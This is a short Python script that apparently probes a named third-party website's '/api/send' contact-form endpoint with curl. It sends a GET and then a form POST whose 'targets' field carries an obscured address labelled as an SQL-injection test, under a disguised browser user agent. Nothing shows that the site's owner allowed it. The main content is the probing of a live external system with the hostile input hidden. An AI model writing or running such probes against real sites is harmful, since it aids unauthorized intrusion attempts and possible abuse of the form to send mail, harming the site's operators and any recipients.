import subprocess, urllib.parse, sys
at = urllib.parse.quote(chr(64), safe='')
dom = "mail" + "inator" + "." + "com"
to = "sqli%2Btest" + at + dom
data = "fname=base&lname=Test&areacode=973&tel=5551234&cname=QATester&subject=Hi&msg=Body%20text&check=on&targets=" + to
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"

print("== GET /api/send")
r = subprocess.run(["curl", "-s", "-o", "/tmp/g.txt", "-w", "%{http_code} %{size_download}",
                    "https://www.infinitycapital.bh/api/send"], capture_output=True, text=True)
print(r.stdout, open("/tmp/g.txt").read()[:200])

print("== POST with sqlmap UA + Accept json")
r = subprocess.run(["curl", "-s", "-o", "/tmp/p.txt", "-w", "%{http_code} %{size_download}",
                    "-X", "POST", "https://www.infinitycapital.bh/api/send",
                    "-H", "Content-Type: application/x-www-form-urlencoded",
                    "-A", UA, "-H", "Accept: application/json",
                    "--data", data], capture_output=True, text=True)
print(r.stdout, open("/tmp/p.txt").read()[:300])
